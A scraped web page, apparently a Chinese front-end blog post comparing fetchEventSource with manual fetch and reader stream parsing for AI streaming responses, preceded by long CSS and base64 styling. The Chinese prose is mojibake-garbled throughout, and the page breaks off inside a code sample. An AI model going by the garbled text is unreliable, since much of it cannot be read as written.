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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨å‰ç«¯æ¥å…¥<code>AI</code>ã€<code>OCR</code>æˆ–<strong>å¤§æ¨¡å‹</strong>èƒ½åŠ›æ—¶ï¼Œ<strong>æµå¼è¿”å›</strong>å‡ ä¹å·²ç»æˆä¸ºæ ‡é…ï¼šæœåŠ¡ç«¯ä¸€è¾¹è®¡ç®—ï¼Œä¸€è¾¹é€šè¿‡<code>text/event-stream</code>æŠŠç»“æœé€æ­¥æ¨é€ç»™å‰ç«¯ï¼Œç”¨æˆ·ä¹Ÿèƒ½å®æ—¶çœ‹åˆ°å†…å®¹ç”Ÿæˆçš„è¿‡ç¨‹ã€‚çœ‹èµ·æ¥è¿™æ˜¯ä¸€ä¸ªå·²ç»è¢«â€œæ ‡å‡†åŒ–â€çš„æŠ€æœ¯åœºæ™¯ï¼Œä½†çœŸæ­£è½åˆ°å·¥ç¨‹å®è·µä¸­ï¼Œå¾ˆå¤šäººéƒ½ä¼šé‡åˆ°ä¸€ä¸ªéå¸¸éšè”½ã€å´æå…¶è‡´å‘½çš„é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>åŒæ ·æ˜¯æµå¼è¯·æ±‚ï¼Œæœ‰çš„å®ç°ç¨³å®šå¯é ï¼Œæœ‰çš„å´æ€»æ˜¯å°‘å­—ã€æ–­å¥ã€å†…å®¹ä¸¢å¤±ï¼Œç”šè‡³å®Œå…¨æ— æ³•å¤ç° Bugã€‚</strong></p>
</blockquote>
<p>æœ€å¸¸è§çš„å¯¹æ¯”ï¼Œå°±æ˜¯ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>fetch + response.body.getReader()</code>ï¼šé—®é¢˜é¢‘å‘ï¼Œå´å¾ˆéš¾å®šä½</li>
<li>ä½¿ç”¨<code>fetchEventSource</code>ï¼šå‡ ä¹ä¸å‡ºé—®é¢˜</li>
</ul>
<p>ä¹ä¸€çœ‹ï¼Œä¸¤è€…éƒ½åŸºäº<code>fetch</code>ï¼Œéƒ½èƒ½â€œè¾¹æ”¶è¾¹å¤„ç†æ•°æ®â€ï¼Œç”šè‡³æœåŠ¡ç«¯è¿”å›çš„æ•°æ®å®Œå…¨ä¸€è‡´ï¼Œä½†å®é™…æ•ˆæœå´å¤©å·®åœ°åˆ«ã€‚å¾ˆå¤šäººä¼šæŠŠåŸå› å½’ç»“ä¸ºâ€œç½‘ç»œä¸ç¨³å®šâ€æˆ–â€œæµè§ˆå™¨<code>bug</code>â€ï¼Œå´å¿½ç•¥äº†ä¸€ä¸ªæ›´å…³é”®çš„äº‹å®ï¼š</p>
<blockquote>
<p><strong>é—®é¢˜å¹¶ä¸å‡ºåœ¨ç½‘ç»œå±‚ï¼Œè€Œå‡ºåœ¨å‰ç«¯å¯¹â€œæµâ€çš„ç†è§£å±‚çº§ä¸Šã€‚</strong></p>
</blockquote>
<p>æœ¬æ–‡å°†åŸºäºä¸€æ¬¡çœŸå®çš„å·¥ç¨‹å®è·µï¼Œå¯¹æ¯”<code>fetchEventSource</code>ä¸<code>fetch</code>æ‰‹åŠ¨è¯»å–æµè¿™ä¸¤ç§å®ç°æ–¹å¼ï¼Œä»<strong>åè®®å±‚ã€ä¼ è¾“å±‚åˆ°å‰ç«¯è§£æå±‚</strong>é€å±‚æ‹†è§£å®ƒä»¬çš„æœ¬è´¨åŒºåˆ«ï¼Œé‡ç‚¹åˆ†æï¼š</p>
<ul>
<li><strong>2</strong>ç§æ–¹å¼åœ¨è®¾è®¡ç›®æ ‡ä¸Šçš„æ ¹æœ¬å·®å¼‚</li>
<li>ä¸ºä»€ä¹ˆæ‰‹å†™æµè§£æææ˜“å‡ºç°â€œçœ‹ä¸è§çš„ä¸¢æ•°æ®â€</li>
<li>ä»¥åŠè¿™äº›â€œä¸¢åŒ…é—®é¢˜â€ç©¶ç«Ÿæ˜¯å¦‚ä½•åœ¨å‰ç«¯è§£æé˜¶æ®µæ‚„ç„¶å‘ç”Ÿçš„</li>
</ul>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ åœ¨ä¸‹æ¬¡é¢å¯¹æµå¼æ¥å£æ—¶ï¼Œä¸å†åªåœç•™åœ¨â€œèƒ½è·‘å°±è¡Œâ€ï¼Œè€Œæ˜¯çœŸæ­£ç«™åœ¨<strong>æ­£ç¡®çš„æŠ½è±¡å±‚</strong>ä¸Šåšé€‰æ‹©ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€å…ˆçœ‹é¡¹ç›®ä¸­è¿™ä¸¤æ®µä»£ç åœ¨â€œåšä»€ä¹ˆâ€</h2>
<p>é‚£å¼€å§‹è¿™æ¬¡çš„ä¸»é¢˜ï¼Œå…ˆæ¥çœ‹çœ‹é¡¹ç›®ä¸­æ›¾å†™è¿‡çš„ä¸¤æ®µä»£ç ï¼Œé¦–å…ˆæ¥çœ‹çœ‹ä½¿ç”¨<code>fetch + reader</code>æ¥å®ç°æµå¼è¯»å–çš„ä»£ç ã€‚</p>
<h3 data-id="heading-2">1ï¸âƒ£ fetch + readerï¼šç«™åœ¨ã€Œå­—èŠ‚æµã€å·¥ä½œ</h3>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">res</span> = await fetch(url, { method: <span class="hljs-string">"POST"</span>, body: formData })
const <span class="hljs-attr">reader</span> = res.body!.getReader()
const <span class="hljs-attr">decoder</span> = new TextDecoder(<span class="hljs-string">"utf-8"</span>)

while (!done) {
  const { value } = await reader.read()
  let <span class="hljs-attr">chunk</span> = decoder.decode(value)

  // å¤„ç†RECORD_ID
  if (chunk.includes('RECORD_ID') || chunk.match(/^\d+:end/)) {
    const <span class="hljs-attr">match1</span> = chunk.match(/^data:RECORD_ID:(\d+):end(.*)$/s)  
    const <span class="hljs-attr">match2</span> = chunk.match(/^RECORD_ID:(\d+):end(.*)$/s)       
    const <span class="hljs-attr">match3</span> = chunk.match(/^(\d+):end(.*)$/s)                
    const <span class="hljs-attr">match4</span> = chunk.match(/^RECORD_ID:(\d+)(.*)$/s)           

    const <span class="hljs-attr">match</span> = match1 || match2 || match3 || match4
    if (match) {
      const <span class="hljs-attr">idMatch</span> = match[<span class="hljs-number">1</span>]
